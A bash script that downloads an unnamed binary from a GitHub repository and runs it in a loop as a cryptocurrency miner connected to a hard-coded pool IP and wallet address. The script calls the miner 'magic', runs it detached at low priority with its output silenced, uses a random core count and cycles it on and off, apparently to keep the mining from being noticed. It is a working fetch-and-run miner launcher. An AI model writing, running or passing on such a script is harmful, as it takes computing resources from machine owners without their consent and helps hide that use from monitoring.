#!/bin/bash

# Check if cpulimit is installed
if ! command -v cpulimit &> /dev/null; then
  echo "cpulimit not found. Installing via yum..."
  sudo yum install -y cpulimit
else
  echo "cpulimit is already installed"
fi

# Check if nice is available
if ! command -v nice &> /dev/null; then
  echo "nice command not found. Installing coreutils..."
  sudo yum install -y coreutils
else
  echo "nice command is available"
fi

# Get the number of CPU cores
total_cores=$(nproc)

# Download the mining script
wget -O tmii https://github.com/barburonjilo/back/raw/main/sr

# Make the mining script executable
chmod +x tmii

# Function to generate the localized date string with core count
generate_worker() {
  local cores=$1
  TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed \
    's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/' \
    | sed "s/$/$cores/"
}

# Function to start the mining process with a random number of cores
start_magic() {
  local num_cores=$(( ( RANDOM % (total_cores - 1) ) + 1 ))  # Randomly choose between 1 and (total_cores - 1)
  local worker=$(generate_worker $num_cores)  # Generate worker string including core count

  # Start the mining process with low priority
  local nice_value=10
  nohup nice -n $nice_value ./tmii -a yescryptr32 --pool 45.115.225.129:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > /dev/null 2>&1 &
  local pid=$!

  echo "Magic started with PID: $pid using $num_cores cores"

  # Save PID to a file for later use
  echo $pid > /tmp/magic_pid
}

# Function to stop the mining process
stop_magic() {
  if [ -f /tmp/magic_pid ]; then
    local pid=$(cat /tmp/magic_pid)
    echo "Stopping magic with PID: $pid"
    kill -9 $pid 2>/dev/null
    rm -f /tmp/magic_pid
  else
    echo "No PID file found, cannot stop magic"
  fi
}

# Run the loop
while true; do
  start_magic
  sleep 300  # Wait for 5 minutes
  stop_magic
  sleep 120  # Wait for 2 minutes
done
